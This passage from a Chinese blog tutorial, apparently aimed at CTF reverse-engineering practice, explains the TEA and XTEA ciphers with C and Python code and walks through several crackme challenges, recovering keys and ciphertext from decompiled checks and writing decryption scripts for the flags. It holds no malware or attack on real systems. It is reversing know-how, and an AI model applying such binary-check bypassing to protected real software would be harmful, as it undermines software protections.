class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;加密前的数据：%u %u\n&quot;</span>,v[<span class="hljs-number">0</span>],v[<span class="hljs-number">1</span>]); <span class="hljs-comment">//%u 以十进制形式输出无符号整数 </span><br>    encrypt(v,k);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;加密后数据：%u %u\n&quot;</span>,v[<span class="hljs-number">0</span>],v[<span class="hljs-number">1</span>]);<br>    decrypt(v,k);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;解密后数据：%u %u\n&quot;</span>,v[<span class="hljs-number">0</span>],v[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs plain">from ctypes import *<br><br><br>def encrypt(v, k):<br>    v0 = c_uint32(v[0])<br>    v1 = c_uint32(v[1])<br>    sum1 = c_uint32(0)<br>    delta = 0x9e3779b9<br>    for i in range(32):<br>        sum1.value += delta<br>        v0.value += ((v1.value &lt;&lt; 4) + k[0]) ^ (v1.value + sum1.value) ^ ((v1.value &gt;&gt; 5) + k[1])<br>        v1.value += ((v0.value &lt;&lt; 4) + k[2]) ^ (v0.value + sum1.value) ^ ((v0.value &gt;&gt; 5) + k[3])<br>    return v0.value, v1.value<br><br><br>def decrypt(v, k):<br>    v0 = c_uint32(v[0])<br>    v1 = c_uint32(v[1])<br>    delta = 0x9e3779b9<br>    sum1 = c_uint32(delta * 32)<br>    for i in range(32):<br>        v1.value -= ((v0.value &lt;&lt; 4) + k[2]) ^ (v0.value + sum1.value) ^ ((v0.value &gt;&gt; 5) + k[3])<br>        v0.value -= ((v1.value &lt;&lt; 4) + k[0]) ^ (v1.value + sum1.value) ^ ((v1.value &gt;&gt; 5) + k[1])<br>        sum1.value -= delta<br>    return v0.value, v1.value<br><br><br>if __name__ == &#x27;__main__&#x27;:<br>    a = [1, 2]<br>    k = [2, 2, 3, 4]<br>    print(&quot;加密前数据:&quot;, a)<br>    res = encrypt(a, k)<br>    print(&quot;加密后的数据:&quot;, res)<br>    res = decrypt(res, k)<br>    print(&quot;解密后数据:&quot;, res)<br></code></pre></td></tr></table></figure><p>原文链接：<a href="https://blog.csdn.net/xiao__1bai/article/details/123307059">https://blog.csdn.net/xiao__1bai&#x2F;article&#x2F;details&#x2F;123307059</a></p><h2 id="XTEA加密"><a href="#XTEA加密" class="headerlink" title="XTEA加密"></a>XTEA加密</h2><h3 id="首先我们还是先了解一下XTEA算法"><a href="#首先我们还是先了解一下XTEA算法" class="headerlink" title="首先我们还是先了解一下XTEA算法"></a><font style="color:rgb(79, 79, 79);">首先我们还是先了解一下XTEA算法</font></h3><p><font style="color:rgb(77, 77, 77);">跟TEA算法很类似，差别就是将r的变化结果和l变化结果进行了交替赋值，同时位移次数进行了一些变化，也掺杂了一些与操作</font></p><p><img src="/./img/49277317_WycRVn6OYK9Yb94C/1741071893775-0ce51887-c1a4-444a-acf3-1fc22abe7c73-191486.png" alt="1741071893775-0ce51887-c1a4-444a-acf3-1fc22abe7c73.png"></p><p><font style="color:rgb(77, 77, 77);">这里是典型的XTEA加密和异或加密，但是根据给定的key和</font><font style="color:rgb(252, 85, 49);">算法</font><font style="color:rgb(77, 77, 77);">，计算出来的是一个假flag：</font><br><font style="color:rgb(77, 77, 77);">fakeflag_plz_Try_more_hard_to_find_the_true_flag</font>  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">encipher</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num_rounds, <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br><span class="hljs-type">uint32_t</span> v0=v[<span class="hljs-number">0</span>],v1=v[<span class="hljs-number">1</span>],sum=<span class="hljs-number">0</span>,delta=<span class="hljs-number">0x9E3779B9</span>;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;num_rounds;i++)&#123;<br>v0+=(((v1&lt;&lt;<span class="hljs-number">4</span>)^(v1&gt;&gt;<span class="hljs-number">5</span>))+v1)^(sum+key[sum&amp;<span class="hljs-number">3</span>]);<br>sum+=delta;<br>v1+=(((v0&lt;&lt;<span class="hljs-number">4</span>)^(v0&gt;&gt;<span class="hljs-number">5</span>))+v0)^(sum+key[(sum&gt;&gt;<span class="hljs-number">11</span>)&amp;<span class="hljs-number">3</span>]);<br>&#125;<br>v[<span class="hljs-number">0</span>]=v0;v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decipher</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num_rounds,<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>],<span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br><span class="hljs-type">uint32_t</span> v0=v[<span class="hljs-number">0</span>],v1=v[<span class="hljs-number">1</span>],delta=<span class="hljs-number">0x9E3779B9</span>,sum=delta*num_rounds;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;num_rounds;i++)&#123;<br>v1-=(((v0&lt;&lt;<span class="hljs-number">4</span>)^(v0&gt;&gt;<span class="hljs-number">5</span>))+v0)^(sum+key[(sum&gt;&gt;<span class="hljs-number">11</span>)&amp;<span class="hljs-number">3</span>]);<br>sum-=delta;<br>v0-=(((v1&lt;&lt;<span class="hljs-number">4</span>)^(v1&gt;&gt;<span class="hljs-number">5</span>))+v1)^(sum+key[sum&amp;<span class="hljs-number">3</span>]);<br>&#125; <br>v[<span class="hljs-number">0</span>]=v0;v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;;<br><span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r=<span class="hljs-number">32</span>;<span class="hljs-comment">//这里是加密轮数，自己设置 </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;加密前原始数据：%u %u\n&quot;</span>,v[<span class="hljs-number">0</span>],v[<span class="hljs-number">1</span>]);<br>encipher(r,v,k);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;加密后原始数据：%u %u\n&quot;</span>,v[<span class="hljs-number">0</span>],v[<span class="hljs-number">1</span>]);<br>decipher(r,v,k);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;解密后原始数据：%u %u\n&quot;</span>,v[<span class="hljs-number">0</span>],v[<span class="hljs-number">1</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;  <br><br></code></pre></td></tr></table></figure><h1 id="TEA例题"><a href="#TEA例题" class="headerlink" title="TEA例题"></a>TEA例题</h1><h2 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h2><p>先查壳，放入64</p><p><img src="/./img/49277317_WycRVn6OYK9Yb94C/1721463402576-04d877a3-3083-429d-8842-70924b64c583-128447.png" alt="1721463402576-04d877a3-3083-429d-8842-70924b64c583.png"></p><p>直接运行exe是个fakeflag哈哈哈哈哈</p><p><img src="/./img/49277317_WycRVn6OYK9Yb94C/1721463517559-d0f3fb8b-b846-4d69-8057-2a0bf5d39813-071515.png" alt="1721463517559-d0f3fb8b-b846-4d69-8057-2a0bf5d39813.png"></p><p>去string里面找关键语句，然后x快捷键去查看调用的函数</p><p><img src="/./img/49277317_WycRVn6OYK9Yb94C/1721463784208-50523ef6-e788-4572-b8d2-33d6210bf472-961606.png" alt="1721463784208-50523ef6-e788-4572-b8d2-33d6210bf472.png"></p><p><img src="/./img/49277317_WycRVn6OYK9Yb94C/1721463842200-a2f6e9f1-73c9-4883-be32-8e7f9480c713-520537.png" alt="1721463842200-a2f6e9f1-73c9-4883-be32-8e7f9480c713.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plain">for ( j = 0; j &lt; 10; ++j )<br>    // 输入函数，scanf<br>    sub_1400111FE(&quot;%x&quot;, &amp;v8[j]);<br>  // v7重新赋值<br>  sub_140011339(v7);<br>  // v8备份到v9<br>  sub_140011145(v8, v9);<br>  // v7为key，v8为输入的值，进行tea加密<br>  sub_1400112B7(v8, v7);<br>  // 验证加密的结果是否符合预期<br>  v6 = sub_140011352(v8);<br>  if ( v6 )<br>  &#123;<br>    // sub_140011195 为打印函数<br>    printf(&quot;you are right\n&quot;);<br>    for ( k = 0; k &lt; 10; ++k )<br>    &#123;<br>      for ( m = 3; m &gt;= 0; --m )<br>        printf(&quot;%c&quot;, (v9[k] &gt;&gt; (8 * m)));<br>    &#125;<br>  &#125;<br>  else<br>  &#123;<br>    printf(&quot;fault!\nYou can go online and learn the tea algorithm!&quot;);<br>  &#125;<br></code></pre></td></tr></table></figure><p>跟进  sub_140011339(v7)，发现v7被重新赋值</p><p><img src="/./img/49277317_WycRVn6OYK9Yb94C/1721464236278-d2535e23-d7c9-402b-a19a-86b3f115c12f-785624.png" alt="1721464236278-d2535e23-d7c9-402b-a19a-86b3f115c12f.png"></p><p>原来的———————————————————&gt;改后的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">v7[0] = 1234;<br>v7[1] = 5678;<br>v7[2] = 9012;<br>v7[3] = 3456;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">v6 = 2233;<br>v7 = 4455;<br>v8 = 6677;<br>v9 = 8899;<br>*a1 = 2233;<br>a1[1] = v7;<br>a1[2] = v8;<br>a1[3] = v9;<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F; v8备份到v9;</p><p>跟进sub_140011145(v8, v9);发现就是一个备份功能的函数</p><p><img src="/./img/49277317_WycRVn6OYK9Yb94C/1721464330297-37f9c77a-2c20-4c0d-9c48-c57216d8e13b-718059.png" alt="1721464330297-37f9c77a-2c20-4c0d-9c48-c57216d8e13b.png"></p><p>&#x2F;&#x2F; v7为key，v8为输入的值，进行tea加密</p><p>  sub_1400112B7(v8, v7);</p><p><img src="/./img/49277317_WycRVn6OYK9Yb94C/1721464401788-9100f9f8-425b-4b90-b9fc-8eacfbef4e37-407908.png" alt="1721464401788-9100f9f8-425b-4b90-b9fc-8eacfbef4e37.png"></p><p>进入 sub_140011B60 函数，得到加密后的数据，开始写脚本</p><p><img src="/./img/49277317_WycRVn6OYK9Yb94C/1721464531316-d3667f6e-f3c0-4e89-bcc4-3217d96cca10-477541.png" alt="1721464531316-d3667f6e-f3c0-4e89-bcc4-3217d96cca10.png"></p><h3 id="cexp"><a href="#cexp" class="headerlink" title="cexp"></a>cexp</h3><p>经典c代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><br><span class="hljs-keyword">int</span> <span class="hljs-title function_ invoke__">main</span>() &#123;<br>    <span class="hljs-keyword">int</span> key[] = &#123;<span class="hljs-number">2233</span>, <span class="hljs-number">4455</span>, <span class="hljs-number">6677</span>, <span class="hljs-number">8899</span>&#125;; <span class="hljs-comment">// 密钥数组</span><br>    unsigned <span class="hljs-keyword">int</span> value[<span class="hljs-number">10</span>]; <span class="hljs-comment">// 用于存储加密数据的数组</span><br>    <br>    <span class="hljs-comment">// 初始化加密数据</span><br>    value[<span class="hljs-number">0</span>] = <span class="hljs-number">0x1A800BDA</span>;<br>    value[<span class="hljs-number">1</span>] = <span class="hljs-number">0xF7A6219B</span>;<br>    value[<span class="hljs-number">2</span>] = <span class="hljs-number">0x491811D8</span>;<br>    value[<span class="hljs-number">3</span>] = <span class="hljs-number">0xF2013328</span>;<br>    value[<span class="hljs-number">4</span>] = <span class="hljs-number">0x156C365B</span>;<br>    value[<span class="hljs-number">5</span>] = <span class="hljs-number">0x3C6EAAD8</span>;<br>    value[<span class="hljs-number">6</span>] = <span class="hljs-number">0x84D4BF28</span>;<br>    value[<span class="hljs-number">7</span>] = <span class="hljs-number">0xF11A7EE7</span>;<br>    value[<span class="hljs-number">8</span>] = <span class="hljs-number">0x3313B252</span>;<br>    value[<span class="hljs-number">9</span>] = <span class="hljs-number">0xDD9FE279</span>;<br>    <br>    <span class="hljs-keyword">int</span> delta = <span class="hljs-number">0xF462900</span>; <span class="hljs-comment">// 一个常量，用于加密算法</span><br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> wheel; <span class="hljs-comment">// 轮数</span><br>    <span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">// 逆算法解密</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">8</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        wheel = <span class="hljs-number">33</span>; <span class="hljs-comment">// 33轮加密</span><br>        sum = delta * (i + wheel);<br>        <span class="hljs-keyword">while</span> (wheel--) &#123;<br>            sum -= delta;<br>            value[i + <span class="hljs-number">1</span>] -= (sum + key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]) ^ (value[i] + ((value[i] &gt;&gt; <span class="hljs-number">5</span>) ^ (<span class="hljs-number">16</span> * value[i])));<br>            value[i] -= sum ^ (value[i + <span class="hljs-number">1</span>] + ((value[i + <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">5</span>) ^ (<span class="hljs-number">16</span> * value[i + <span class="hljs-number">1</span>]))) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 将解密后的数据转换为字符并输出</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; i++) &#123;<br>        <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (value[i] &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>); <span class="hljs-comment">// 高8位</span><br>        <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (value[i] &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>); <span class="hljs-comment">// 次高8位</span><br>        <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (value[i] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>);  <span class="hljs-comment">// 次低8位</span><br>        <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, value[i] &amp; <span class="hljs-number">0xFF</span>);         <span class="hljs-comment">// 低8位</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="pyexp（会有乱码）"><a href="#pyexp（会有乱码）" class="headerlink" title="pyexp（会有乱码）"></a>pyexp（会有乱码）</h3><p>python代码可以会输出乱码，主要是溢出的问题，去掉乱码投机正确，还是c比较科学一点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plain">def main():<br>    key = [2233, 4455, 6677, 8899]  # 密钥数组<br>    value = [0x1A800BDA, 0xF7A6219B, 0x491811D8, 0xF2013328, 0x156C365B,<br>             0x3C6EAAD8, 0x84D4BF28, 0xF11A7EE7, 0x3313B252, 0xDD9FE279]  # 初始化加密数据<br><br>    delta = 0x0F462900  # 一个常量，用于加密算法<br>    sum = 0<br><br>    # 逆算法解密<br>    for i in range(8, -1, -1):<br>        wheel = 33  # 33轮加密<br>        sum = delta * (i + wheel)<br>        while wheel &gt; 0:<br>            sum -= delta<br>            sum &amp;= 0xFFFFFFFF  # 保持为32位<br>            value[i + 1] -= ((sum + key[(sum &gt;&gt; 11) &amp; 3]) ^ (value[i] + ((value[i] &gt;&gt; 5) ^ (16 * value[i]))))<br>            value[i + 1] &amp;= 0xFFFFFFFF  # 保持为32位<br>            value[i] -= (sum ^ (value[i + 1] + ((value[i + 1] &gt;&gt; 5) ^ (16 * value[i + 1]))) ^ (sum + key[sum &amp; 3]))<br>            value[i] &amp;= 0xFFFFFFFF  # 保持为32位<br>            wheel -= 1<br><br>    # 将解密后的数据转换为字符并输出<br>    for val in value:<br>        print(chr((val &gt;&gt; 24) &amp; 0xFF), end=&#x27;&#x27;)  # 高8位<br>        print(chr((val &gt;&gt; 16) &amp; 0xFF), end=&#x27;&#x27;)  # 次高8位<br>        print(chr((val &gt;&gt; 8) &amp; 0xFF), end=&#x27;&#x27;)  # 次低8位<br>        print(chr(val &amp; 0xFF), end=&#x27;&#x27;)  # 低8位<br><br><br>if __name__ == &quot;__main__&quot;:<br>    main()<br></code></pre></td></tr></table></figure><h2 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h2><p><img src="/./img/49277317_WycRVn6OYK9Yb94C/1722054641314-437f3875-8b54-40ad-b516-4b8aeb067346-013190.png" alt="1722054641314-437f3875-8b54-40ad-b516-4b8aeb067346.png"></p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plain">scanf(&quot;%s&quot;, v5);<br>  v9 = v5;<br>  // 将输入的值赋入 v4的后八位<br>  for ( i = 0; i &lt;= 5; ++i )<br>    v4[i + 8] = *v9++;<br>  // 两两进行XTea加密<br>  for ( j = 0; j &lt;= 2; ++j )<br>    tea_encrypt(&amp;v4[2 * j + 8], &amp;key);<br>  // 加密后的字符串要等于这些<br>    v4[0] = -1054939302;<br>    v4[1] = -1532163725;<br>    v4[2] = -165900264;<br>    v4[3] = 853769165;<br>    v4[4] = 768352038;<br>    v4[5] = 876839116;<br>  for ( k = 0; k &lt;= 5; ++k )<br>  &#123;<br>    if ( v4[k] != v4[k + 8] )<br>    &#123;<br>      printf(&quot;ERROR!&quot;);<br>      exit(9);<br>    &#125;<br>  &#125;<br><br></code></pre></td></tr></table></figure><h3 id="按d，将key合成为4位、8字节的形式，再提取"><a href="#按d，将key合成为4位、8字节的形式，再提取" class="headerlink" title="按d，将key合成为4位、8字节的形式，再提取"></a>按d，将key合成为4位、8字节的形式，再提取</h3><h3 id=""><a href="#" class="headerlink" title=""></a><img src="/./img/49277317_WycRVn6OYK9Yb94C/1722055208022-54aca640-c283-4a51-97c1-ff089748e031-359230.png" alt="1722055208022-54aca640-c283-4a51-97c1-ff089748e031.png"></h3><h3 id="tea加密函数"><a href="#tea加密函数" class="headerlink" title="tea加密函数"></a>tea加密函数</h3><h3 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="/./img/49277317_WycRVn6OYK9Yb94C/1722054654216-26498323-00c8-402e-ba33-5de480f1e045-722843.png" alt="1722054654216-26498323-00c8-402e-ba33-5de480f1e045.png"></h3><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs plain">#include&lt;stdio.h&gt;<br><br>int main()<br>&#123;<br>    unsigned int enc[6] = &#123;0xC11EE75A, 0xA4AD0973, 0xF61C9018, 0x32E37BCD, 0x2DCC1F26, 0x344380CC&#125;;<br>    unsigned int key[4] = &#123;0x10203, 0x4050607, 0x8090A0B, 0x0C0D0E0F&#125;;<br>    int i, j;<br>    long sum = 0, delta = 0x61C88647;<br>    // 解码<br>    for(i=0;i &lt; 6;i+=2)&#123;<br>       sum =  0 - (32 * delta);<br>       for(j = 0; j &lt; 32; j++) &#123;<br>          enc[i+1] -= (((enc[i] &gt;&gt; 5) ^ (16 * enc[i])) + enc[i]) ^ (key[((sum &gt;&gt; 11) &amp; 3)] + sum);<br>          sum += delta;<br>          enc[i] -= ((((enc[i+1] &gt;&gt; 5) ^ (16 * enc[i+1])) + enc[i+1]) ^ key[sum &amp; 3] + sum);<br>       &#125;<br>    &#125;<br>    // 打印<br>    for (i = 0; i &lt; 6; i++)<br>    &#123;<br>       for (j = 0; j&lt;=3; j++)<br>       &#123;<br>          printf(&quot;%c&quot;, (enc[i] &gt;&gt; (j * 8)) &amp; 0xFF);<br>       &#125;<br>    &#125;<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_WycRVn6OYK9Yb94C/1722054984122-9065a0d4-00c2-489e-be39-81b6ca45ea63-607171.png" alt="1722054984122-9065a0d4-00c2-489e-be39-81b6ca45ea63.png"></p><h2 id="ezzzz"><a href="#ezzzz" class="headerlink" title="ezzzz"></a>ezzzz</h2><p>先每8位转化成一个数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plain">def string_to_hex_with_prefix(input_string):<br>    # 创建一个空的结果数组<br>    hex_result = []<br><br>    # 每 8 个字符一组<br>    for i in range(0, len(input_string), 8):<br>        chunk = input_string[i:i + 8]<br><br>        # 将每组字符转为十六进制并加上 &#x27;0x&#x27; 前缀<br>        hex_value = int(chunk.encode(&#x27;utf-8&#x27;).hex())<br><br>        # 添加到数组中<br>        hex_result.append(hex_value)<br><br>    return hex_result<br><br><br># 示例<br>input_string = &quot;f1f186b25a96c782e6c63a0b70b61b5ced6bf84889700d6b09381b5ccb2f24fab1c79e796d822d9cdcc55f760f780e750d65c4afb89084a9e978c3827a8dd81091f28df3a84dbacab4d75f75f19af8e5b90f80fcfc10a5c3d20679fb2bc734c8ccb31c921ac52ad3e7f922b72e24d923fb4ce9f53548a9e571ebc25adf38862e10059186327509463dd4d54c905abc36c26d5312d2cd42c0772d99e50cd4c4665c3178d63a7ffe71ada251c070568d5a5798c2921ec0f7fc3ae9d8418460762930ca6a2dccef51d2a1a8085491b0f82d686ca34774c52d0f0f26449fc28d362c86f3311b8adc4fb1a4497e34e0f0915d&quot;  # 输入字符串<br>hex_output = string_to_hex_with_prefix(input_string)<br><br># 输出结果<br>print(&quot;Hexadecimal array:&quot;, hex_output)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_WycRVn6OYK9Yb94C/1731845706786-36a034f2-3c1d-4e61-8f9d-7216d9758903-615657.png" alt="1731845706786-36a034f2-3c1d-4e61-8f9d-7216d9758903.png"></p><h2 id="喝茶"><a href="#喝茶" class="headerlink" title="喝茶"></a>喝茶</h2><p>上面为密文，记得转成十六进制</p><p>提取key和密文</p><p><img src="/./img/49277317_WycRVn6OYK9Yb94C/1745052012351-cc6c7c61-56f5-434f-b0ef-3c82a32d04d2-542956.png" alt="1745052012351-cc6c7c61-56f5-434f-b0ef-3c82a32d04d2.png"></p><p><img 